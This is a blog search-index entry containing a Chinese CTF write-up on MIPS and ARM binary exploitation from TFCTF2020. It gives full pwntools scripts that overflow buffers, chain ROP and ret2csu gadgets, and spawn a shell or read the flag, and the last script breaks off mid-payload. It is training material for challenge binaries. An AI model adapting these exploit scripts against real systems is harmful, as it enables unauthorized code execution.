<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>异构 PWN 0x2 入门</title>
    <link href="/2020/11/12/%E5%BC%82%E6%9E%84%20PWN%200x2%20%E5%85%A5%E9%97%A8/"/>
    <url>/2020/11/12/%E5%BC%82%E6%9E%84%20PWN%200x2%20%E5%85%A5%E9%97%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="异构-PWN-0x2-入门"><a href="#异构-PWN-0x2-入门" class="headerlink" title="异构 PWN 0x2 入门"></a>异构 PWN 0x2 入门</h1><blockquote><p>本文以TFCTF2020中的题目为例，介绍常规mips和arm题目的解法和思路</p><p>其中部分内容参考了绿油油刘的博客<a href="https://www.lyyl.online/2020/10/22/Arm-Pwn-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E8%B0%83%E8%AF%95/">ARM环境搭建</a></p></blockquote><h2 id="MIPS"><a href="#MIPS" class="headerlink" title="MIPS"></a>MIPS</h2><h3 id="汇编指令"><a href="#汇编指令" class="headerlink" title="汇编指令"></a>汇编指令</h3><p>mips汇编指令可查阅以下网站</p><p><a href="https://www.cnblogs.com/CoBrAMG/p/9237609.html">https://www.cnblogs.com/CoBrAMG/p/9237609.html</a></p><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p>本题程序为32位MIPSEL架构动态链接</p><p>查看发现没有开启任何保护，但是<code>checksec</code>对异构程序的检测有时可能会不准确，因此还是考虑通过<code>rop</code>来<code>getshell</code></p><p><img src="https://gitee.com/wang842948487/IMGbase/raw/master/img/20201018232455.png" alt="image-20201018232455015"></p><p>通过IDA发现该程序流程几乎和<code>HelloARM</code>一样，但程序中调用了<code>system</code>函数并且输出了其地址</p><p><img src="https://gitee.com/wang842948487/IMGbase/raw/master/img/20201018233031.png" alt="image-20201018233031230"></p><p>程序的溢出点在<code>read</code>处，偏移可以通过<code>pwntools</code>中的<code>cyclic</code>爆破，也可以通过静态分析得到，如图</p><p>程序首先将返回值<code>$ra</code>存入栈顶指针<code>$sp + 0x11c </code>处，栈基指针<code>$fp</code>存入<code>$sp + 0x118</code>处，之后将<code>$sp</code>赋值给<code>$fp</code></p><p><img src="https://gitee.com/wang842948487/IMGbase/raw/master/img/20201018233519.png" alt="image-20201018233519584"></p><p>之后在进行<code>read</code>时, 其实的写入位置是<code>$fp + 0x18</code>, 因此最后的偏移就是<code>offset = 0x11c - 0x18 = 0x104</code></p><p><img src="https://gitee.com/wang842948487/IMGbase/raw/master/img/20201018234623.png" alt="image-20201018234623210"></p><p>之后只需要找一个适合的<code>gadget</code>即可<code>get shell</code></p><p>在这里我通过<code>ropper</code>找到了这个地址</p><p><code>0x0000b114: lw $t9, ($sp); lw $a0, 4($sp); jalr $t9; nop;</code></p><p>之后在程序执行过程中向<code>name</code>写入<code>/bin/sh</code></p><p>并在溢出后的栈上依次布置好<code>system_addr</code>以及<code>name_addr</code>即可</p><p><strong>注:   由于这里我找到的<code>gadget</code>比较好, 因此没出现什么问题, 但在做<code>ARM</code>或者<code>MIPS</code>架构题目时容易出现栈位置变化导致攻击失败的情况, 此时可以考虑利用<code>喷射</code>的思想,在栈上布置满<code>name_addr</code>, 问题就有可能得以解决</strong></p><p>EXP：</p><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><span class="hljs-comment">#coding=utf-8</span><span class="hljs-comment">#__author__: N1K0_</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> LibcSearcher<span class="hljs-keyword">import</span> inspect<span class="hljs-keyword">from</span> sys <span class="hljs-keyword">import</span> argv<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ret2libc</span>(<span class="hljs-params">leak, func, path=<span class="hljs-string">&#x27;&#x27;</span></span>):</span>    <span class="hljs-keyword">if</span> path == <span class="hljs-string">&#x27;&#x27;</span>:        libc = LibcSearcher(func, leak)        base = leak - libc.dump(func)        system = base + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)        binsh = base + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)    <span class="hljs-keyword">else</span>:        libc = ELF(path)        base = leak - libc.sym[func]        system = base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]        binsh = base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))    <span class="hljs-keyword">return</span> (base, system, binsh,)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak</span>(<span class="hljs-params">var</span>):</span>    callers_local_vars = inspect.currentframe().f_back.f_locals.items()    temp =  [var_name <span class="hljs-keyword">for</span> var_name, var_val <span class="hljs-keyword">in</span> callers_local_vars <span class="hljs-keyword">if</span> var_val <span class="hljs-keyword">is</span> var][<span class="hljs-number">0</span>]    p.info(temp + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(var))s      = <span class="hljs-keyword">lambda</span> data               :p.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))plt     = <span class="hljs-keyword">lambda</span> data               :elf.plt[data]got     = <span class="hljs-keyword">lambda</span> data               :elf.got[data]sym     = <span class="hljs-keyword">lambda</span> data               :libc.sym[data]itr     = <span class="hljs-keyword">lambda</span>                    :p.interactive()local_libc  = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>local_libc_32 = <span class="hljs-string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>remote_libc = <span class="hljs-string">&#x27;&#x27;</span>binary = <span class="hljs-string">&#x27;./HelloMIPS&#x27;</span>elf = ELF(binary,checksec=<span class="hljs-literal">False</span>)libc = ELF(<span class="hljs-string">&#x27;./lib/libuClibc-0.9.30.1.so&#x27;</span>)p = process([<span class="hljs-string">&quot;qemu-mipsel-static&quot;</span>, <span class="hljs-string">&quot;-g&quot;</span>, <span class="hljs-string">&quot;1234&quot;</span>,<span class="hljs-string">&quot;./HelloMIPS&quot;</span>])<span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(argv) &gt; <span class="hljs-number">1</span>:    <span class="hljs-keyword">if</span> argv[<span class="hljs-number">1</span>]==<span class="hljs-string">&#x27;r&#x27;</span>:        p = remote(<span class="hljs-string">&#x27;10.104.255.211&#x27;</span>,<span class="hljs-number">7777</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dbg</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):</span>    os.system(<span class="hljs-string">&#x27;tmux set mouse on&#x27;</span>)    context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]    gdb.attach(p,cmd)    pause()<span class="hljs-comment"># start </span>context.log_level = <span class="hljs-string">&#x27;DEBUG&#x27;</span><span class="hljs-comment"># 0x0001d600: lw $t9, 0x40($sp); nop; jalr $t9; nop; </span><span class="hljs-comment"># 0x0000b114: lw $t9, ($sp); lw $a0, 4($sp); jalr $t9; nop;</span>pause()sla(<span class="hljs-string">&#x27;EL.\n&#x27;</span>,<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)ru(<span class="hljs-string">&#x27;ber:&#x27;</span>)magic = <span class="hljs-built_in">int</span>(ru(<span class="hljs-string">&#x27;\n&#x27;</span>),<span class="hljs-number">16</span>)base = magic - sym(<span class="hljs-string">&#x27;system&#x27;</span>)one = base+ <span class="hljs-number">0xb114</span>name = <span class="hljs-number">0x440E20</span>leak(magic)leak(base)leak(one)pause()pl = <span class="hljs-string">&#x27;/bin/sh\00&#x27;</span>.ljust(<span class="hljs-number">0x104</span>,<span class="hljs-string">&#x27;a&#x27;</span>) + p32(one) + p32(magic) + p32(name)s(pl)<span class="hljs-comment"># end</span>itr()</code></pre><h2 id="ARM"><a href="#ARM" class="headerlink" title="ARM"></a>ARM</h2><h3 id="汇编指令-1"><a href="#汇编指令-1" class="headerlink" title="汇编指令"></a>汇编指令</h3><p><code>32</code>位下</p><ul><li><p><code>arm32</code> 只有 <code>16</code> 个 <code>32bit</code> 的通用寄存器 <code>r0</code>~<code>r12</code> , <code>lr</code>, <code>pc</code>, <code>sp</code></p></li><li><p><code>arm32</code>用四个寄存器即<code>r0-r3</code>传递前四个参数，被调用的子函数返回前无需恢复<code>r0-r3</code>内容，<code>r0</code>被用来存储函数调用的返回值。使用寄存器<code>r4-r11</code>来保存局部变量。如果子程序中使用了这些寄存器，那么在进入时需要保存这些寄存器的值，并在返回时恢复这些寄存器的值。<code>r7</code>经常用来存储系统调用号，<code>r11</code>存放着栈帧边界的值<code>fp(ebp)</code>。</p></li><li><p><code>r13</code>用作堆栈指针，记作<code>sp</code>，在子程序中<code>r13</code>不能用作其他的用途，进入子程序和返回子程序中<code>sp</code>的值必须相等。也就是说函数的栈帧由<code>fp,sp</code>来指定边界。</p><p><img src="https://gitee.com/wang842948487/IMGbase/raw/master/img/20201112221821.png" alt="图片无法显示，请联系作者"></p></li></ul><ul><li><p><code>r14</code>用来保存返回地址记作<code>LR</code>，如果子程序中保存了返回地址，那么<code>r14</code>可以用作其他的用途。</p></li><li><p><code>r15</code>是程序计数器<code>PC</code>。在程序执行过程中，<code>ARM</code>模式下存储当前指令<code>+8</code>也就是两条<code>ARM</code>指令之后的位置，<code>Thumb(v1)</code>模式下<code>PC</code>存储着当前指令<code>+4</code>即两条<code>Thumb</code>指令之后的地址。</p></li><li><p><code>32</code>位下堆栈操作是<code>8</code>字节对齐的，常用到的指令是<code>STMFD,LDFMD</code>。<code>STMFD SP! ,&#123;R0-R7，LR&#125;</code>该指令是将<code>R0-R7,LR</code>寄存器中的值依次压栈，最后<code>sp</code>指向的是栈顶的位置，也就是<code>LR</code>的值所在的位置。<code>STMFD SP ,&#123;R0-R7，LR&#125;</code>指令中<code>sp</code>会在压完参数之后回到原位，不会改变<code>sp</code>的值。</p><p>也就是说<code>!</code>表示的是当数据传输完毕之后更新寄存器的值。否则寄存器的值不变。</p></li><li><p>如果程序中进行了外部调用，则必须满足下面两点，一个是外部接口的堆栈必须是<code>8</code>字节对齐的，汇编程序中使用<code>PRESERVE8</code>伪指令来告诉连接器，汇编程序是<code>8</code>字节对齐的。</p></li><li><p><code>LDR</code>指令通常用来从内存中加载数据，<code>STR</code>指令则被用作将寄存器的值存放到内存中。</p><pre><code class="hljs x86asm"><span class="hljs-keyword">str</span> <span class="hljs-built_in">r2</span>, [<span class="hljs-built_in">r1</span>, #<span class="hljs-number">2</span>]  @ 取址模式：基于偏移量。<span class="hljs-built_in">R2</span>寄存器中的值<span class="hljs-number">0x3</span>被存放到<span class="hljs-built_in">R1</span>寄存器的值加<span class="hljs-number">2</span>所指向地址处。<span class="hljs-keyword">str</span> <span class="hljs-built_in">r2</span>, [<span class="hljs-built_in">r1</span>, <span class="hljs-built_in">r2</span>, <span class="hljs-keyword">LSL</span>#<span class="hljs-number">2</span>]  @ 取址模式：基于偏移量。<span class="hljs-built_in">R2</span>寄存器中的值<span class="hljs-number">0x3</span>被存放到<span class="hljs-built_in">R1</span>寄存器的值加(左移两位后的<span class="hljs-built_in">R2</span>寄存器的值)所指向地址处。<span class="hljs-built_in">R1</span>寄存器不会被修改。<span class="hljs-keyword">str</span> <span class="hljs-built_in">r2</span>, [<span class="hljs-built_in">r1</span>, <span class="hljs-built_in">r2</span>, <span class="hljs-keyword">LSL</span>#<span class="hljs-number">2</span>]! @ 取址模式：基于索引前置修改。<span class="hljs-built_in">R2</span>寄存器中的值<span class="hljs-number">0x3</span>被存放到<span class="hljs-built_in">R1</span>寄存器的值加(左移两位后的<span class="hljs-built_in">R2</span>寄存器的值)所指向地址处，之后<span class="hljs-built_in">R1</span>寄存器中的值被更新,也就<span class="hljs-built_in">R1</span> = <span class="hljs-built_in">R1</span> + <span class="hljs-built_in">R2</span>&lt;&lt;<span class="hljs-number">2</span>。ldr <span class="hljs-built_in">r3</span>, [<span class="hljs-built_in">r1</span>], <span class="hljs-built_in">r2</span>, <span class="hljs-keyword">LSL</span>#<span class="hljs-number">2</span>  @ 取址模式：基于索引后置修改。<span class="hljs-built_in">R3</span>寄存器中的值是从<span class="hljs-built_in">R1</span>寄存器的值所指向的地址中加载的，加载之后<span class="hljs-built_in">R1</span>寄存器中的值被更新也就是<span class="hljs-built_in">R1</span> = <span class="hljs-built_in">R1</span> + <span class="hljs-built_in">R2</span>&lt;&lt;<span class="hljs-number">2</span>。</code></pre></li><li><p><code>B</code>简单的跳转功能，（分支链接）<code>BL</code>将<code>PC+4</code>保存为<code>LR</code>并跳转至目标地址（由于叶子函数不会改变<code>LR</code>寄存器的值，因此叶子函数可以直接通过<code>LR</code>寄存器进行返回），（分支交换）<code>BX</code>和分支链接交换<code>BLX</code>用于将指令集从<code>ARM</code>交换到<code>Thumb</code>。</p></li></ul><p><code>64</code>位下<code>AArch40</code></p><ul><li><p><code>arm64</code>有<code>32</code>个<code>64bit</code>长度的通用寄存器<code>x0-x30</code>以及<code>sp</code>，可以用<code>w0-w30</code>访问寄存器中的<code>4</code>字节</p></li><li><p><code>arm64</code>用八个寄存器即<code>x0-x7</code>传递前八个参数</p></li><li><p><code>R30</code>也就是<code>LR</code>，保存返回地址，<code>R29</code>也就是<code>FP</code>，保存函数栈的基址，在一些情况下返回值是通过<code>R8</code>返回的。</p></li><li><p>除了批量加载指令<code>LDM/STM,PUSH/POP</code>，使用<code>STP/LDP</code>对加载指令的寄存器进行替换。常见的内存读写指令有</p><p><code>LDR，LDRB，LDRSB，LDRH，LDRSW，STR，STRB，STRH</code></p><p>此处<code>R – Register</code>(寄存器)、<code>B – Byte</code>(字节-8bit)、<code>SB – Signed Byte</code>(有符号字节)、<code>RH – Half Word</code>(半字-<code>16bit</code>)、<code>SW- Signed Word</code>(带符号字-<code>32bit</code>)。</p></li><li><p><code>64</code>位中取消了<code>32</code>位下的一些指令，如<code>vswp</code>指令，条件执行指令<code>subgt,addle</code>等。<code>mov r2, r1, lsl #2</code>仅在<code>ARM32</code>下支持，它等同于<code>ARM64</code>的<code>lsl r2, r1, #2</code></p></li></ul><p><code>ARM 32</code>和<code>ARM64</code>常用指令的对应情况。</p><p><a href="https://image.lyyl.online/images/2020/10/23/20201023104622.png"><img src="https://gitee.com/wang842948487/IMGbase/raw/master/img/20201112221811.png" alt="图片无法显示，请联系作者"></a></p><h3 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h3><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>两个题目时一个<code>binary</code>，区别就是第一个是直接通过<code>orw</code>读取<code>flag</code>的内容，因为程序一开始已经<code>open(&quot;./flag&quot;)</code>，第二个则<code>flag</code>文件名称未知，需要<code>getshell</code>才能够获取得到<code>flag</code>。两种方法都是执行<code>rop</code>。</p><p>程序很明显的存在栈溢出。这里的<code>gadget</code>我们选择的是<code>ret2csu</code>也就是使用的是<code>libc_csu_init</code>中的函数调用链，这个和<code>linux</code>下的相同。</p><p>这里可以先通过ida来了解一下arm架构的特点,</p><p>可以看到 arm程序的栈基址和返回值是存在函数空间的<code>地地址位</code>上的, 也就是说, 我们无法通过栈溢出来覆盖当前函数的返回值,</p><p>只能去覆盖其母函数(main函数)的返回值</p><p><img src="https://gitee.com/wang842948487/IMGbase/raw/master/img/20201112222758.png" alt="image-20201112222758407"></p><p>第二个点是arm在执行跳转指令<code> BLR X3</code>时, 实际上跳转的目标是x3寄存器中值指向的地址的值,  不注意的话很容易会出错</p><p>题目本身的利用部分并不难,一些涉及到地址的内容如果嫌麻烦不想算的话,可以直接通过<code>pwndbg的search</code>来搜索目标地址/字符串所在的地址, 再计算其与栈地址的差值即可</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>ORW</p><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><span class="hljs-comment">#coding=utf-8</span><span class="hljs-comment">#__author__:NightK1n9_</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> LibcSearcher<span class="hljs-keyword">import</span> inspect<span class="hljs-keyword">from</span> sys <span class="hljs-keyword">import</span> argv<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ret2libc</span>(<span class="hljs-params">leak, func, path=<span class="hljs-string">&#x27;&#x27;</span></span>):</span>    <span class="hljs-keyword">if</span> path == <span class="hljs-string">&#x27;&#x27;</span>:        libc = LibcSearcher(func, leak)        base = leak - libc.dump(func)        system = base + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)        binsh = base + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)    <span class="hljs-keyword">else</span>:        libc = ELF(path)        base = leak - libc.sym[func]        system = base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]        binsh = base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))    <span class="hljs-keyword">return</span> (base, system, binsh,)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak</span>(<span class="hljs-params">var</span>):</span>    callers_local_vars = inspect.currentframe().f_back.f_locals.items()    temp =  [var_name <span class="hljs-keyword">for</span> var_name, var_val <span class="hljs-keyword">in</span> callers_local_vars <span class="hljs-keyword">if</span> var_val <span class="hljs-keyword">is</span> var][<span class="hljs-number">0</span>]    p.info(temp + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(var))s      = <span class="hljs-keyword">lambda</span> data               :p.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))plt     = <span class="hljs-keyword">lambda</span> data               :elf.plt[data]got     = <span class="hljs-keyword">lambda</span> data               :elf.got[data]sym     = <span class="hljs-keyword">lambda</span> data               :libc.sym[data]itr     = <span class="hljs-keyword">lambda</span>                    :p.interactive()binary = <span class="hljs-string">&#x27;./HelloARM&#x27;</span>context.binary = binaryelf = ELF(binary,checksec=<span class="hljs-literal">False</span>)libc = elf.libc<span class="hljs-comment"># p = process(&#x27;./HelloARM&#x27;)</span><span class="hljs-comment"># p = process([&quot;qemu-aarch64&quot;,&quot;-L&quot;,&quot;/home/wang/workshop/CTF/exec/my_race/2020/tsctf/3&quot;,&quot;./HelloARM&quot;])</span>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<span class="hljs-comment"># cmd = &#x27;b *0x400ad0\n&#x27;</span>cmd = <span class="hljs-string">&#x27;b *0x400ab0\n&#x27;</span>p = gdb.debug(context.binary.path,cmd)<span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(argv) &gt; <span class="hljs-number">1</span>:    <span class="hljs-keyword">if</span> argv[<span class="hljs-number">1</span>]==<span class="hljs-string">&#x27;r&#x27;</span>:        <span class="hljs-comment"># p = remote(&#x27;10.104.255.211&#x27;,7777)</span>        p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">10003</span>)<span class="hljs-comment"># start </span>context.log_level = <span class="hljs-string">&#x27;DEBUG&#x27;</span><span class="hljs-comment"># --------------------------------- 1 接收栈地址</span>ru(<span class="hljs-string">&quot;number:&quot;</span>)magic = <span class="hljs-built_in">int</span>(r(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)leak(magic)target = <span class="hljs-number">0x411080</span>+<span class="hljs-number">0x200</span>read_plt = plt(<span class="hljs-string">&#x27;read&#x27;</span>)write_plt = plt(<span class="hljs-string">&#x27;write&#x27;</span>)sla(<span class="hljs-string">&#x27;name:&#x27;</span>,<span class="hljs-string">&#x27;wang&#x27;</span>)<span class="hljs-comment"># ----------------------------------- 2 利用ret2csu执行orw</span><span class="hljs-comment"># padding</span>pl = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x100</span><span class="hljs-comment"># 填充main函数的栈基址和返回值地址   ret2csu</span>pl+= p64(magic)+p64(<span class="hljs-number">0x400ad0</span>)<span class="hljs-comment"># 因为‘ooooooo’函数返回时令sp+0x110 因此要先填充</span><span class="hljs-comment"># x19 &amp; padding</span>pl+= (p64(read_plt)+p64(write_plt)).ljust(<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;a&#x27;</span>) + p64(<span class="hljs-number">0</span>) +<span class="hljs-string">&#x27;&#x27;</span>.ljust(<span class="hljs-number">0xe8</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<span class="hljs-comment"># 根据ret2csu进行构造</span><span class="hljs-string">&#x27;&#x27;&#x27;</span><span class="hljs-string">x19 = 0</span><span class="hljs-string">x20 = 1</span><span class="hljs-string">x21 = call</span><span class="hljs-string">x22 = arg1</span><span class="hljs-string">x23 = arg2</span><span class="hljs-string">x24 = arg3</span><span class="hljs-string">&#x27;&#x27;&#x27;</span><span class="hljs-comment"># 基址和返回值地址（需要可读地址）</span>pl+= p64(magic) + p64(<span class="hljs-number">0x400ab0</span>)<span class="hljs-comment"># padding and x20</span>pl+= p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">1</span>) <span class="hljs-comment"># read(3,target,0x20)</span><span class="hljs-comment"># 要注意csu中取的是x21中地址的值</span>pl+= p64(magic<span class="hljs-number">-0x10</span>) + p64(<span class="hljs-number">5</span>) + p64(magic+<span class="hljs-number">0x520</span>) + p64(<span class="hljs-number">0x20</span>)<span class="hljs-comment"># 第二轮</span><span class="hljs-comment"># 栈基址 返回值</span>pl+= p64(magic) + p64(<span class="hljs-number">0x400ab0</span>)<span class="hljs-comment"># padding and x2</span>pl+= p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">1</span>) <span class="hljs-comment"># write(1,target,0x20)</span>pl+= p64(magic<span class="hljs-number">-0x8</span>) + p64(<span class="hljs-number">1</span>) + p64(magic+<span class="hljs-number">0x520</span>) + p64(<span class="hljs-number">0x20</span>)sa(<span class="hljs-string">&#x27;message:&#x27;</span>,pl)itr()</code></pre><p>system</p><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><span class="hljs-comment">#coding=utf-8</span><span class="hljs-comment">#__author__:NightK1n9_</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> LibcSearcher<span class="hljs-keyword">import</span> inspect<span class="hljs-keyword">from</span> sys <span class="hljs-keyword">import</span> argv<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ret2libc</span>(<span class="hljs-params">leak, func, path=<span class="hljs-string">&#x27;&#x27;</span></span>):</span>    <span class="hljs-keyword">if</span> path == <span class="hljs-string">&#x27;&#x27;</span>:        libc = LibcSearcher(func, leak)        base = leak - libc.dump(func)        system = base + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)        binsh = base + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)    <span class="hljs-keyword">else</span>:        libc = ELF(path)        base = leak - libc.sym[func]        system = base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]        binsh = base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))    <span class="hljs-keyword">return</span> (base, system, binsh,)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak</span>(<span class="hljs-params">var</span>):</span>    callers_local_vars = inspect.currentframe().f_back.f_locals.items()    temp =  [var_name <span class="hljs-keyword">for</span> var_name, var_val <span class="hljs-keyword">in</span> callers_local_vars <span class="hljs-keyword">if</span> var_val <span class="hljs-keyword">is</span> var][<span class="hljs-number">0</span>]    p.info(temp + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(var))s      = <span class="hljs-keyword">lambda</span> data               :p.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))plt     = <span class="hljs-keyword">lambda</span> data               :elf.plt[data]got     = <span class="hljs-keyword">lambda</span> data               :elf.got[data]sym     = <span class="hljs-keyword">lambda</span> data               :libc.sym[data]itr     = <span class="hljs-keyword">lambda</span>                    :p.interactive()binary = <span class="hljs-string">&#x27;./HelloARM&#x27;</span>context.binary = binaryelf = ELF(binary,checksec=<span class="hljs-literal">False</span>)libc = elf.libc<span class="hljs-comment"># p = process(&#x27;./HelloARM&#x27;)</span>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<span class="hljs-comment"># cmd = &#x27;b *0x400ad0\n&#x27;</span>cmd = <span class="hljs-string">&#x27;b *0x400ad0\n&#x27;</span><span class="hljs-comment"># cmd = &#x27;b *0x4009cc\n&#x27;</span><span class="hljs-comment"># cmd+= &#x27;b *0x400970\n&#x27;</span>p = gdb.debug(context.binary.path,cmd)<span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(argv) &gt; <span class="hljs-number">1</span>:    <span class="hljs-keyword">if</span> argv[<span class="hljs-number">1</span>]==<span class="hljs-string">&#x27;r&#x27;</span>:        <span class="hljs-comment"># p = remote(&#x27;10.104.255.211&#x27;,7777)</span>        p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">10003</span>)<span class="hljs-comment"># start </span>context.log_level = <span class="hljs-string">&#x27;DEBUG&#x27;</span><span class="hljs-comment"># --------------------------- 1 接收栈地址</span>ru(<span class="hljs-string">&quot;number:&quot;</span>)magic = <span class="hljs-built_in">int</span>(r(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)write_plt = plt(<span class="hljs-string">&#x27;write&#x27;</span>)write_got = got(<span class="hljs-string">&#x27;write&#x27;</span>)system = sym(<span class="hljs-string">&#x27;system&#x27;</span>)binsh = <span class="hljs-number">0x411080</span>vul_addr = <span class="hljs-number">0x4009cc</span> <span class="hljs-comment"># 需要回到main，如果回到ooo的话无法覆盖返回值</span>leak(magic)leak(write_got)sla(<span class="hljs-string">&#x27;name:&#x27;</span>,<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<span class="hljs-comment"># --------------------------- 2 第一次rop 执行write_plt(0,write_got,0x20) 泄露libc基址</span><span class="hljs-comment"># padding</span>pl = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x100</span><span class="hljs-comment"># 填充main函数的栈基址和返回值地址   ret2csu</span>pl+= p64(magic)+p64(<span class="hljs-number">0x400ad0</span>)<span class="hljs-comment"># 因为‘ooooooo’函数返回时令sp+0x110 因此要先填充</span><span class="hljs-comment"># x19 &amp; padding</span>pl+= p64(write_plt).ljust(<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;a&#x27;</span>) + p64(<span class="hljs-number">0</span>) +<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0xe8</span><span class="hljs-comment"># 根据ret2csu进行构造</span><span class="hljs-string">&#x27;&#x27;&#x27;</span><span class="hljs-string">x19 = 0</span><span class="hljs-string">x20 = 1</span><span class="hljs-string">x21 = call</span><span class="hljs-string">x22 = arg1</span><span class="hljs-string">x23 = arg2</span><span class="hljs-string">x24 = arg3</span><span class="hljs-string">&#x27;&#x27;&#x27;</span><span class="hljs-comment"># 基址和返回值地址（需要可读地址）</span>pl+= p64(magic) + p64(<span class="hljs-number">0x400ab0</span>)<span class="hljs-comment"># padding and x20</span>pl+= p64(<span class="hljs-number">0</span>) + p64(<span 